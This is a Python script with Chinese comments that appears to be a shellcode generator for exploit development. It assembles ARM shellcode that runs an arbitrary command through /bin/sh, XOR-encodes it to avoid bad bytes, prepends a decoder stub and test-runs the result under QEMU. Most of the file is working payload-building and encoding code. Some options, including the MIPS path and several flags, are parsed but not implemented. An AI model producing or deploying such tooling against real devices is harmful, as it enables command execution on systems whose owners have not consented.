import shutil
import sys
import os
import subprocess
import argparse
import random
import textwrap
import urllib.parse
from pwn import *

# --- 配置你的交叉编译器路径 ---
current_user = os.getlogin()
os.makedirs("shellcode_directory", exist_ok=True)
config = {
    "shellcode_directory": "shellcode_directory",  # 存放生成的shellcode文件的目录
    # ARM 编译器路径 (例如: arm-linux-musleabi-)
    "ARM_TOOLCHAIN_PATH": None,
    "qemu_path": None
}


class CTestHarnessGenerator:
    """
    一个用于生成、编译并执行C语言Shellcode测试框架的类。
    它接收原始的二进制数据(bytes)并自动格式化。
    """

    def __init__(self, shellcode_bytes):
        """
        初始化生成器。
        参数:
            shellcode_bytes (bytes): 完整的、最终的shellcode二进制数据。
        """
        if not isinstance(shellcode_bytes, bytes):
            raise TypeError("shellcode_bytes 参数必须是 bytes 类型。")
        self.shellcode_bytes = shellcode_bytes
        self.generate_and_run()

    def _format_shellcode_as_c_string(self):
        """
        [修正] 将二进制数据格式化为C语言的字符串字面量数组。
        """
        if not self.shellcode_bytes:
            return '    "";'
        c_string_lines = []
        for i in range(0, len(self.shellcode_bytes), 4):
            chunk = self.shellcode_bytes[i:i + 4]
            hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
            c_string_lines.append(f'"{hex_string}"')
        return '\n'.join(c_string_lines) + '\n;'

    def generate_and_run(self):
        """
        生成、编译并执行完整的C语言测试文件。

        参数:
            qemu_path (str): QEMU静态模拟器的路径。
        """

        # 1. [修正] 准备C代码前，先格式化shellcode
        formatted_shellcode = self._format_shellcode_as_c_string()
        final_c_code = f"""
#include <stdio.h>
#include <string.h>

char shellcode[] =
{formatted_shellcode}


void main(void)
{{
    printf("[+] Shellcode 大小: %zu 字节\\n", sizeof(shellcode) - 1);
    void (*s)(void) = (void (*)())shellcode;
    printf("[+] 准备执行shellcode...\\n");
    s();
    printf("[+] Shellcode 执行完毕。\\n");
}}
"""

        qemu_path = config['qemu_path']
        c_file_path = os.path.join(config["shellcode_directory"], "verify_shellcode.c")
        elf_file_path = os.path.join(config["shellcode_directory"], "verify_shellcode")
        # 2. 写入文件
        try:
            with open(c_file_path, "w") as f:
                f.write(final_c_code)
            print(f"[+] C语言测试文件 '{c_file_path}' 已成功生成。")
        except IOError as e:
            print(f"[-] 错误: 写入文件 '{c_file_path}' 失败: {e}")
            return
        # 3. 编译
        print(" --- [编译中] ---")
        proc = subprocess.run([
            f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-z", "execstack", "-static", "-g", "-o", elf_file_path,
            c_file_path], capture_output=True, text=True)
        if proc.returncode != 0:
            print(" [-] 编译失败!")
            print(" --- STDERR ---")
            print(proc.stderr)
            return

        print("[+] 编译成功!")
        # 4. 执行
        print(" --- [执行中] ---")

        run_proc = subprocess.run([qemu_path, elf_file_path], capture_output=True, text=True)
        print(" --- STDOUT ---")
        print(run_proc.stdout)
        if run_proc.stderr:
            print(" --- STDERR ---")
            print(run_proc.stderr)


def print_as_python_bytes(data, var_name="shellcode", line_len=12):
    """
    将二进制数据打印成Python中通过 += 逐行构建字节字符串的格式。
    例如: buf += b"\\xde\\xad\\xbe\\ef"
    """
    # 首先打印初始化行
    print(f'{var_name} = b""')

    # 每次处理 line_len 个字节
    for i in range(0, len(data), line_len):
        # 获取当前行的数据块
        chunk = data[i:i + 4]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印 "buf += b'...'" 格式的字符串
        print(f'{var_name} += b"{hex_string}"')


class arm:
    """
    一个为 ARM 架构生成 XOR 编码 shellcode 的多功能类。

    它会自动处理坏字节，并生成一个同样不含坏字节的解码器存根（decoder stub），
    最终将解码器和加密后的 payload 拼接在一起。
    【重构说明】: 解码器已根据要求切换回 AArch32 (标准ARM) 模式。
    """
    EXECVE_TEMPLATE_ARM = """
    .section .text
    .global _start
    .arm

    _start:
        @ execve("/bin/sh", ["/bin/sh", "-c", command], NULL)
        adr r0, shell_strings   @ r0 -> "/bin/sh"

        @ 【关键修复】正确地在栈上构建 argv 数组
        @ 1. 计算其他字符串的地址
        add r1, r0, #8          @ r1 -> "-c"
        add r2, r0, #11         @ r2 -> command 字符串
        eor r3, r3, r3          @ r3 = 0 (NULL)

        @ 2. 在栈上为4个指针分配16字节空间
        sub sp, sp, #16

        @ 3. 按正确顺序存储指针
        str r0, [sp, #0]        @ argv[0] = &("/bin/sh")
        str r1, [sp, #4]        @ argv[1] = &("-c")
        str r2, [sp, #8]        @ argv[2] = &("{command}")
        str r3, [sp, #12]       @ argv[3] = NULL

        @ 4. 设置 execve 的参数
        mov r0, r0              @ r0 仍然是 &("/bin/sh")
        mov r1, sp              @ r1 = argv (现在 sp 正确地指向数组开头)
        mov r2, r3              @ r2 = envp (NULL)

        mov r7, #11             @ execve 的系统调用号
        svc #0                  @ 发起系统调用

    failed_exec:
        @ 如果 execve 失败, 则调用 exit(1) 干净地退出
        mov r0, #1              @ 设置退出码为 1
        mov r7, #1              @ exit 的系统调用号
        svc #0                  @ 发起系统调用

    shell_strings:
        .string "/bin/sh"
        .asciz "-c"
        .asciz "{command}"
    """

    # 【最终方案】回归V1，使用LDRB/STRB并修复跳转逻辑
    DECODER_TEMPLATE_ARM = """
.section .text
.global _start
.arm

_start:
    @ --- 步骤 1: 获取 payload 的地址 (使用 r4) ---
    adr r4, payload_start     @ 获取 payload 的地址存入 r4

    @ --- 步骤 2: 加载密钥(r5)和循环次数(r6) ---
    {key_loader}
    {count_loader}

decode_loop:
    @ --- 步骤 3: 解码循环 (使用 r7, r8 作为临时寄存器) ---
    @ 替换 ldr r7, [r4]
    ldrb r7, [r4, #3]         @ 加载最高位字节
    lsl r7, r7, #24           @ 左移24位
    ldrb r8, [r4, #2]         @ 加载次高位字节
    orr r7, r7, r8, lsl #16   @ 合并
    ldrb r8, [r4, #1]         @ 加载次低位字节
    orr r7, r7, r8, lsl #8    @ 合并
    ldrb r8, [r4]             @ 加载最低位字节
    orr r7, r7, r8            @ 合并最终的字到 r7

    eor r7, r7, r5            @ 与密钥进行 XOR 操作

    @ 替换 str r7, [r4], #4
    strb r7, [r4], #1         @ 存储最低位字节, r4++
    mov r8, r7, lsr #8
    strb r8, [r4], #1         @ 存储次低位字节, r4++
    mov r8, r7, lsr #16
    strb r8, [r4], #1         @ 存储次高位字节, r4++
    mov r8, r7, lsr #24
    strb r8, [r4], #1         @ 存储最高位字节, r4++

    subs r6, r6, #1           @ 循环计数器减 1
    bne decode_loop           @ 如果计数器不为零，则继续循环

    @ --- 步骤 4: 跳转到已解码的 shellcode (使用 r4, r8) ---
    {loop_count_loader_for_jump} @ 加载循环次数到 r8
    lsl r8, r8, #2               @ r8 = loop_count * 4
    sub r4, r4, r8               @ r4 指针回退到 payload 开头
    bx r4                        @ 跳转并开始执行

payload_start:
    @ 加密后的 shellcode 将被放置在这里
"""

    def __init__(self, command, bad_bytes=None, save_files=True, validate=False):
        """
        初始化编码器并自动执行整个编码流程。
        """
        print("[*] 初始化 ARM (AArch32) XOR 编码器...")
        # 步骤 1: 初始化所有属性
        self.encoded_shellcode = None
        self.decoder_stub = None
        self.final_shellcode = None

        self.bad_bytes = set(bad_bytes if bad_bytes is not None else [0x00])
        self.save_files = save_files
        self.key = None
        self.loop_count = 0

        # [重构] 首先，根据传入的命令生成原始 shellcode
        self.raw_shellcode = self._generate_shellcode_from_asm(command)

        # [重构] 在初始化时直接调用核心处理函数
        self.xorencoder()
        self.xordecoder()
        self.merged_shellcode()

        # [新增] 如果用户指定，则执行验证
        # if validate:
        # self.validate_shellcode()

    def _generate_shellcode_from_asm(self, command):
        """
        [重构] 使用 ARM 汇编模板和交叉编译器来生成执行特定命令的原始 shellcode。
        """
        print(f"[*] 正在从汇编代码生成原始 shellcode (命令: '{command}')...")

        final_asm = self.EXECVE_TEMPLATE_ARM.format(command=command)

        tmp_s_path = os.path.join(config["shellcode_directory"], "arm_raw_shellcode.s")
        tmp_o_path = os.path.join(config["shellcode_directory"], "arm_raw_shellcode.o")
        tmp_bin_path = os.path.join(config["shellcode_directory"], "arm_raw_shellcode.bin")

        with open(tmp_s_path, "w") as f:
            f.write(final_asm)

        try:
            cmd_as = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd_as, check=True, capture_output=True)

            cmd_objcopy = [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path,
                           tmp_bin_path]
            subprocess.run(cmd_objcopy, check=True, capture_output=True)

            with open(tmp_bin_path, "rb") as f:
                binary_code = f.read()

            print(f"✅ 原始 shellcode 生成成功 ({len(binary_code)} 字节).")
            return binary_code
        finally:
            if not self.save_files:
                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f):
                        os.remove(f)

    def xorencoder(self):
        """
        [逻辑还原] 暴力搜索一个能生成不含坏字节 payload 的密钥。
        此函数现在只检查编码后的shellcode。
        """
        print("[*] 开始寻找安全的 XOR 密钥...")
        print(f"    -- 检查目标: 仅编码后的 payload")
        print(f"    -- 定义的坏字节: {[hex(b) for b in self.bad_bytes]}")

        # 计算填充和循环次数
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_len = len(self.raw_shellcode) + padding_needed
        self.loop_count = padded_len // 4

        print("[*] 密钥搜索已启动...")
        max_attempts = 200000
        for attempt in range(max_attempts):
            if (attempt + 1) % 50000 == 0:
                print(f"    -- 仍在搜索... (已尝试 {attempt + 1}/{max_attempts} 次)")

            key = random.randint(1, 0xFFFFFFFF)

            # --- 只检查编码后的 payload ---
            encoded_payload = self._internal_xorencode(key, self.raw_shellcode)
            if any(b in self.bad_bytes for b in encoded_payload):
                continue

            # --- 成功: payload 不含坏字节 ---
            print(f"\n✅ 成功！在 {attempt + 1} 次尝试后找到可用方案。")
            print(f"[*] 找到安全密钥: {hex(key)}")

            self.key = key
            self.encoded_shellcode = encoded_payload

            print("\n[*] 编码后的 Shellcode (Python 格式):")
            print_as_python_bytes(self.encoded_shellcode)
            return

        raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到能生成干净 payload 的密钥。")

    def xordecoder(self):
        """
        [逻辑还原] 使用找到的密钥和循环次数生成解码器存根。
        此函数不检查生成的解码器是否包含坏字节，依赖于优化的汇编模板。
        """
        print("\n[*] 正在生成解码器...")
        key_loader_asm = self._get_safe_value_loader('r5', self.key)
        count_loader_asm = self._get_safe_value_loader('r6', self.loop_count)
        # 为跳转逻辑加载循环次数到 r8
        loop_count_loader_for_jump_asm = self._get_safe_value_loader('r8', self.loop_count)

        decoder_asm_final = self.DECODER_TEMPLATE_ARM.format(
            key_loader=key_loader_asm,
            count_loader=count_loader_asm,
            loop_count_loader_for_jump=loop_count_loader_for_jump_asm
        )

        self.decoder_stub = self._compile(decoder_asm_final)
        print("[*] 生成的解码器 (Python 格式):")
        print_as_python_bytes(self.decoder_stub, var_name="decoder_stub")

    def merged_shellcode(self):
        """
        将解码器和编码后的 payload 拼接成最终的 shellcode。
        """
        if not self.decoder_stub or not self.encoded_shellcode:
            print("[-] 错误: 解码器或编码后的payload不存在，无法合并。")
            return
        self.final_shellcode = self.decoder_stub + self.encoded_shellcode
        print("\n[*] 已将解码器和 payload 合并。")

    def validate_shellcode(self):
        """
        [新增] 通过 QEMU user-mode 动态编译并执行最终的 shellcode 以进行验证。
        """
        print("\n[*] 开始验证生成的 Shellcode...")
        # 检查依赖
        if not shutil.which(f"{config['ARM_TOOLCHAIN_PATH']}gcc"):
            print("[!] 警告: 未找到 'arm-linux-gnueabi-gcc'。跳过验证。")
            return
        if not shutil.which("qemu-arm"):
            print("[!] 警告: 未找到 'qemu-arm'。跳过验证。")
            return

        # [修正] 验证最终生成的 shellcode，而不是原始的 shellcode
        c_shellcode = ", ".join([f"0x{b:02x}" for b in self.final_shellcode])

        # C 语言加载器模板
        c_loader_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{ {c_shellcode} }};

int main(void) {{
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    memcpy(mem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode 已加载到内存，准备跳转...\\n\\n");
    fflush(stdout);
    ((void (*)(void))mem)();
    return 0;
}}
"""
        # 定义临时文件路径
        c_file_path = os.path.join(config["shellcode_directory"], "arm_verify_shellcode.c")
        elf_file_path = os.path.join(config["shellcode_directory"], "arm_verify_shellcode")

        try:
            # 写入 C 文件
            with open(c_file_path, "w") as f:
                f.write(c_loader_code)
            print(f"    -- 已生成 C 语言加载器: {c_file_path}")

            # 编译 C 文件
            subprocess.run([
                f"{config['ARM_TOOLCHAIN_PATH']}gcc",
                "-o", elf_file_path,
                c_file_path,
                "-static"  # 静态链接对于 QEMU user-mode 很重要
            ], check=True, capture_output=True)

            # 使用 QEMU 执行
            print("------ QEMU 输出开始 ------")
            result = subprocess.run(["qemu-arm", elf_file_path], capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print("--- stderr ---")
                print(result.stderr)
            print("------ QEMU 输出结束 ------\n")

            if result.returncode == 0:
                print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
            else:
                print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")

        except subprocess.CalledProcessError as e:
            print(f"\n[!!!] 验证失败: 编译 C 加载器时出错。")
            print(f"--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")
        finally:
            if not self.save_files:
                for f in [c_file_path, elf_file_path]:
                    if os.path.exists(f):
                        os.remove(f)

    def _internal_xorencode(self, key, data_to_encode):
        """
        内部辅助函数：使用给定的密钥对数据进行 XOR 编码。
        """
        # 使用一个不含坏字节的 ARM NOP 指令 (mov r1, r1 -> e1a01001) 作为填充
        arm_nop = b'\x01\x10\xa0\xe1'
        padding_needed = (4 - len(data_to_encode) % 4) % 4

        padded_data = data_to_encode + (arm_nop * (padding_needed // 4))

        encoded_buffer = bytearray()
        for i in range(0, len(padded_data), 4):
            chunk = padded_data[i:i + 4]
            dword = int.from_bytes(chunk, 'little')
            xored_dword = (dword ^ key).to_bytes(4, 'little')
            encoded_buffer.extend(xored_dword)
        return bytes(encoded_buffer)

    def _get_safe_value_loader(self, register, value):
        if value < 256:
            # 使用 mov 指令，避免 ldr，因为 ldr 可能会从 .pool 加载数据，引入坏字节
            return f"mov {register}, #{value}\n"
        if value < 0x10000:
            return f"movw {register}, #{value}\n"

        lower16 = value & 0xFFFF
        upper16 = (value >> 16) & 0xFFFF
        instr = f"movw {register}, #{lower16}\n"
        if upper16 != 0:
            instr += f"movt {register}, #{upper16}\n"
        return instr

    def _compile(self, asm_code):
        """
        [重构] 只编译汇编代码，不进行坏字节检查。
        """
        tmp_s_path = os.path.join(config["shellcode_directory"], "arm_xor_decoder.s")
        tmp_o_path = os.path.join(config["shellcode_directory"], "arm_xor_decoder.o")
        tmp_bin_path = os.path.join(config["shellcode_directory"], "arm_xor_decoder.bin")
        with open(tmp_s_path, "w") as f:
            f.write(asm_code)
        try:
            # [重构] 移除 -mthumb 参数，使用默认的 ARM 模式
            cmd = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd, check=True, capture_output=True)

            subprocess.run(
                [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path, tmp_bin_path],
                check=True, capture_output=True)
            with open(tmp_bin_path, "rb") as f:
                binary_code = f.read()
            return binary_code
        except subprocess.CalledProcessError as e:
            print(
                f"\n[!!!] 汇编失败! 来自 'as' 的错误信息:\n--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")
            return b''
        finally:
            if not self.save_files:
                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f): os.remove(f)


def armtest():
    # [重构] 参数改为固定值，不再使用 argparse
    command = 'ls'
    bad_bytes = ['00', '0a']
    save_files = True
    validate = True  # 设置为 True 来默认执行验证

    try:
        bad_bytes_int = [int(b, 16) for b in bad_bytes]

        # [重构] 将 command 直接传递给构造函数
        encoder = arm(command, bad_bytes=bad_bytes_int, save_files=save_files, validate=validate)
        print("\n" + "=" * 20 + " 最终结果 " + "=" * 20)
        print_as_python_bytes(encoder.final_shellcode)
        print("=" * 50)
        encoder.validate_shellcode()
        print("-" * 60)

    except (FileNotFoundError, ValueError, RuntimeError) as e:
        print(f"\n[!!!] 程序出错: {e}")


def main():
    # --- 使用 argparse 解析命令行参数 ---
    parser = argparse.ArgumentParser(
        description="为一个命令生成 ARM 或 MIPS 架构的 shellcode。",
        formatter_class=argparse.RawTextHelpFormatter  # 保持帮助文本格式
    )
    parser.add_argument("-arch", "--arch", choices=['arm', 'mips'], help="目标CPU架构 (arm 或 mips)")
    parser.add_argument("-e", "--endian", choices=['big', 'little'], help="shellcode 字节序 (big 或 little)")
    parser.add_argument("-cmd", "--cmd", help="要执行的命令")
    parser.add_argument("-xor", "--xor_encode", action="store_true", help="对shellcode进行XOR编码")
    parser.add_argument("-v", "--verify", action="store_true", help="编译运行验证shellcode")
    parser.add_argument("-s", "--sleep", action="store_true", help="在shellcode前面加上睡眠指令,default 3秒")
    parser.add_argument("-l", "--long_shellcode", action="store_true", help="生成长shellcode")

    args = parser.parse_args()

    if args.arch == "mips":
        if args.endian == "little":
            print(f"🔴 info: 使用小端字节序 (little-endian) 编码 shellcode。")
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"/{current_user}/mips32el--glibc--stable-2024.05-1/bin/mipsel-buildroot-linux-gnu-"
            config['qemu_path'] = "qemu-mipsel-static"
        else:
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"/{current_user}/mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-"
            config['qemu_path'] = "qemu-mips-static"
            print(f"🔵 info: 使用大端字节序 (big-endian) 编码 shellcode。")
    else:
        # 简化处理，因为armtest是硬编码的
        print(f"🔴 info: 使用小端字节序 (little-endian) 编码 shellcode。")
        # 请确保这里的路径是正确的
        config[
            'ARM_TOOLCHAIN_PATH'] = f"/{current_user}/armv7-eabihf--uclibc--stable-2024.05-1/bin/arm-buildroot-linux-uclibcgnueabihf-"
        config['qemu_path'] = "qemu-arm-static"

    armtest()


if __name__ == "__main__":
    main()
